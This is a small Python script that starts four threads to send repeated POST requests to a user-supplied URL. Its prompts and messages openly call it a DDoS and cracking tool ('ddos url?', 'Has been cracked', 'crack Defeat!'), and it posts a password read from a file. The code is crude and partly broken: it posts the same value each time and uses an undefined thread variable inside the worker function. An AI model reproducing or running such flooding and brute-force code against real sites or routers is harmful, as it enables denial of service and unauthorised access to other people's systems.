import requests
import threading
import itertools

threads_name = 0

f = open('threads_logs.txt', encoding='utf-8')
password = f.read()
# http://192.168.2.1
def duoxiancheng(weishu2, url):
    user_agent = {
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
    }

    cishu = 0
    while cishu <= weishu2:
        cishu = int(cishu)
        cishu += 1

        data = {'data': password}
        getdata = requests.post(url, data)
        e = getdata.text
        if cishu % 100 == 0:
            print("Has been cracked:", cishu, '————', thread.getName())
            with open('test.txt', 'a') as f:
                f.write("Has been cracked:\n")
                cishu = str(cishu)
                f.write(cishu)
                f.write('---------')
                f.write(thread.getName())
    print("crack Defeat!")


threads = []
url = input('ddos url?\n')
ddoscishu = int(input('cishu?\n'))
for x in range(8, 12):
    threads.append(threading.Thread(target=duoxiancheng, args=(ddoscishu, url)))

for thread in threads:
    threads_name = int(threads_name)
    threads_name += 1
    threads_name = str(threads_name)
    thread.setName(threads_name)
    thread.start()
for thread in threads:
    thread.join()
